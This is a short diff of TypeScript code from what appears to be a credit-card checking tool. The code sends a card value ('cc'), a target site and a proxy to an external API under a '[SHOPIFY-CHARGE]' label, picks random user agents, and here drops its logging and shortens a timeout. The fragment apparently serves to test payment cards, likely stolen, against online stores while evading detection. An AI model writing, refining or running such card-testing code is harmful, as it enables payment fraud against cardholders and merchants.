@@ -141,13 +141,11 @@ const userAgents = [
 
 const getRandomItem = <T>(arr: T[]): T => arr[Math.floor(Math.random() * arr.length)];
 
-const callApi = async (cc: string, site: string, proxy: string): Promise<{ status: string; message: string; apiResponse: string; rawResponse: string; price: number; priceStr: string }> => {
+const callApiOnce = async (cc: string, site: string, proxy: string): Promise<{ status: string; message: string; apiResponse: string; rawResponse: string; price: number; priceStr: string }> => {
   const apiUrl = `${API_BASE_URL}?site=${encodeURIComponent(site)}&cc=${encodeURIComponent(cc)}&proxy=${proxy}`;
   
-  console.log(`[SHOPIFY-CHARGE] Calling: ${API_BASE_URL}?site=${site}&cc=***&proxy=${proxy ? 'yes' : 'none'}`);
-  
   const controller = new AbortController();
-  const timeoutId = setTimeout(() => controller.abort(), 60000);
+  const timeoutId = setTimeout(() => controller.abort(), 55000);
   
   try {
     const response = await fetch(apiUrl, {
@@ -162,7 +160,6 @@ const callApi = async (cc: string, site: string, proxy: string): Promise<{ statu
     
     clearTimeout(timeoutId);
     const rawText = await response.text();
-    console.log(`[SHOPIFY-CHARGE] Response: ${rawText.substring(0, 500)}`);
     
     if (!rawText || rawText.trim() === '') {
       return { status: 'unknown', message: 'Empty response', apiResponse: '', rawResponse: '', price: 0, priceStr: '$0.00' };
